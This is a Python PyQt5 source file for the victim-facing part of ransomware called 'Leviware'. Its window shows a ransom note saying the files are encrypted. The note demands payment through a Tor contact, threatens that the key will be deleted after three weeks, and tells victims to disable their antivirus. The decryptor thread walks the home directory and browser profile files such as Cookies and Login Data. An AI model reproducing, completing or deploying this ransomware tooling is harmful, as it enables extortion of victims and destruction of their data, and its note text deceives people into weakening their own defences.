import sys
import os
from PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit, QPushButton, QTextEdit, QStackedWidget, QScrollArea
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QFont
from cryptography.fernet import Fernet

class DecryptionThread(QThread):
    update_signal = pyqtSignal(str)
    finished_signal = pyqtSignal()

    def __init__(self, target_directory, key):
        super().__init__()
        self.target_directory = target_directory
        self.file_extensions = ['.txt', '.doc', '.xls', '.ppt', '.odt', '.jpg', '.png', '.csv', '.pdf', '.docx', '.xlsx', '.pptx', '.psd', '.ai', '.indd', '.eps', '.raw', '.cr2', '.nef', '.orf', '.sr2', '.db', '.sql', '.mdb', '.accdb', '.dbf', '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx', '.dwg', '.dxf', '.zip', '.rar', '.7z', '.tar', '.gz', '.iso', '.vmdk', '.vdi', '.key', '.pages', '.numbers', '.sqlite', '.dat', '.json', '.xml', '.bak', '.log', '.ini', '.config', '.reg', '.lnk', '.url', '.bookmark', '.history', '.cache']
        self.cipher = Fernet(key)

    def decrypt_file(self, file_path):
        try:
            with open(file_path, 'rb') as file:
                encrypted_data = file.read()
            decrypted_data = self.cipher.decrypt(encrypted_data)
            with open(file_path, 'wb') as file:
                file.write(decrypted_data)
            self.update_signal.emit(f"Successfully decrypted: {file_path}")
        except Exception as e:
            self.update_signal.emit(f"Error decrypting {file_path}: {str(e)}")

    def decrypt_browser_data(self):
        browsers = {
            'chrome': os.path.join(self.target_directory, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default'),
            'edge': os.path.join(self.target_directory, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default'),
            'firefox': os.path.join(self.target_directory, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
        }

        for browser, path in browsers.items():
            if os.path.exists(path):
                if browser in ['chrome', 'edge']:
                    self.decrypt_chromium_based(path)
                elif browser == 'firefox':
                    self.decrypt_firefox(path)

    def decrypt_chromium_based(self, path):
        files_to_decrypt = ['History', 'Bookmarks', 'Cookies', 'Login Data', 'Web Data']
        for file in files_to_decrypt:
            file_path = os.path.join(path, file)
            if os.path.exists(file_path):
                self.decrypt_file(file_path)

    def decrypt_firefox(self, profile_path):
        for root, dirs, files in os.walk(profile_path):
            for file in files:
                if file.endswith('.sqlite'):
                    file_path = os.path.join(root, file)
                    self.decrypt_file(file_path)

    def run(self):
        try:
            for root, dirs, files in os.walk(self.target_directory):
                for filename in files:
                    full_path = os.path.join(root, filename)
                    if any(full_path.lower().endswith(ext) for ext in self.file_extensions):
                        self.decrypt_file(full_path)
            
            self.decrypt_browser_data()
        except Exception as e:
            self.update_signal.emit(f"Error: {str(e)}")
        finally:
            self.finished_signal.emit()

class DecryptorGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("File Decryption Utility")
        self.setGeometry(100, 100, 800, 600)

        self.stacked_widget = QStackedWidget()
        self.setCentralWidget(self.stacked_widget)

        self.create_info_page()
        self.create_decryption_page()

    def create_info_page(self):
        info_widget = QWidget()
        layout = QVBoxLayout()

        title = QLabel("ATTENTION: YOUR FILES HAVE BEEN ENCRYPTED")
        title.setFont(QFont("Arial", 18, QFont.Bold))
        title.setStyleSheet("color: red;")
        layout.addWidget(title, alignment=Qt.AlignCenter)

        scroll_area = QScrollArea()
        scroll_content = QWidget()
        scroll_layout = QVBoxLayout(scroll_content)

        info_text = """
        <h2>Your Personal Files Are Encrypted (By Leviware)!</h2>
        <p>All your documents, photos, databases and other important files have been encrypted with a strong algorithm. The private decryption key is stored on our server and nobody can decrypt your files without this key.</p>

        <p>Your Important Files Encryption produced on this computer: All your files, documents, photos, databases and other important files are encrypted with the strongest encryption and unique key, generated for this computer. Private decryption key is stored on a secret Internet server and nobody can decrypt your files until do the instructions to obtain the private key.</p>

        <p>If you see this text, but don't see the decryptor window - your antivirus deleted it. Don't worry, it's easy to fix. Just disable your antivirus and run the file again. The antivirus companies are not able to detect and remove our software in time.</p>

        <h3>What Happened to My Computer?</h3>
        <p>Your important files are encrypted. Many of your documents, photos, videos, databases and other files are no longer accessible because they have been encrypted. Maybe you are busy looking for a way to recover your files, but do not waste your time your files are not recoverable without our decryption service.</p>

        <h3>Can I Recover My Files?</h3>
        <p>Sure. We guarantee that you can recover all your files safely and easily. But you need to do the instructions.</p>

        <h3>What are the instructions?</h3>
        <p>You have two options:
        <ol>
            <li>Pay the ransom and we will give you the private key to decrypt your files.</li>
            <li>Do not pay the ransom and wait 3 weeks, after the key will be deleted from our servers and your files will be irretrievable.</li>
        </ol>

        <h3>How to Contact Us</h3>
        <p>Tor_Address</p>
        <p>Write your personal ID in the title of your message otherwise it will be ignored.</p>

        <h3>Your personal ID is included on the IMPORTANT FILES ENCRYPTION.txt file</h3>

        <p>Attention!</p>
        <p>Do not rename encrypted files.</p>
        <p>Do not try to decrypt your data using third party software, it may cause permanent data loss.</p>
        <p>Decryption of your files with the help of third parties may cause more requirements or you can become a victim of a scam.</p>
        """

        info_label = QLabel(info_text)
        info_label.setWordWrap(True)
        info_label.setTextFormat(Qt.RichText)
        info_label.setAlignment(Qt.AlignLeft | Qt.AlignTop)
        scroll_layout.addWidget(info_label)

        scroll_area.setWidget(scroll_content)
        scroll_area.setWidgetResizable(True)
        layout.addWidget(scroll_area)

        proceed_button = QPushButton("Proceed to Decryption")
        proceed_button.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(1))
        layout.addWidget(proceed_button, alignment=Qt.AlignCenter)

        info_widget.setLayout(layout)
        self.stacked_widget.addWidget(info_widget)

    def create_decryption_page(self):
        decryption_widget = QWidget()
        layout = QVBoxLayout()

        title = QLabel("File Decryption")
        title.setFont(QFont("Arial", 16, QFont.Bold))
        layout.addWidget(title, alignment=Qt.AlignCenter)

        self.info_label = QLabel("Enter the decryption key and click 'Start Decryption' to decrypt your files and browser data.")
        self.info_label.setWordWrap(True)
        layout.addWidget(self.info_label)

        key_layout = QHBoxLayout()
        self.key_input = QLineEdit()
        self.key_input.setPlaceholderText("Enter decryption key here")
        key_layout.addWidget(self.key_input)
        self.decrypt_button = QPushButton("Start Decryption")
        self.decrypt_button.clicked.connect(self.start_decryption)
        key_layout.addWidget(self.decrypt_button)
        layout.addLayout(key_layout)

        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        layout.addWidget(self.log_output)

        back_button = QPushButton("Back to Information")
        back_button.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(0))
        layout.addWidget(back_button, alignment=Qt.AlignLeft)

        decryption_widget.setLayout(layout)
        self.stacked_widget.addWidget(decryption_widget)

    def start_decryption(self):
        key = self.key_input.text().encode()
        target_directory = os.path.expanduser("~")

        try:
            Fernet(key)
        except:
            self.log_output.append("Invalid decryption key. Please check and try again.")
            return

        self.decrypt_thread = DecryptionThread(target_directory, key)
        self.decrypt_thread.update_signal.connect(self.update_log)
        self.decrypt_thread.finished_signal.connect(self.decryption_finished)
        
        self.decrypt_button.setEnabled(False)
        self.log_output.clear()
        self.log_output.append("Decryption process started...")
        self.decrypt_thread.start()

    def update_log(self, message):
        self.log_output.append(message)

    def decryption_finished(self):
        self.log_output.append("\nDecryption process completed.")
        self.log_output.append("If you encountered any issues, please contact support.")
        self.decrypt_button.setEnabled(True)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = DecryptorGUI()
    window.show()
    sys.exit(app.exec_())
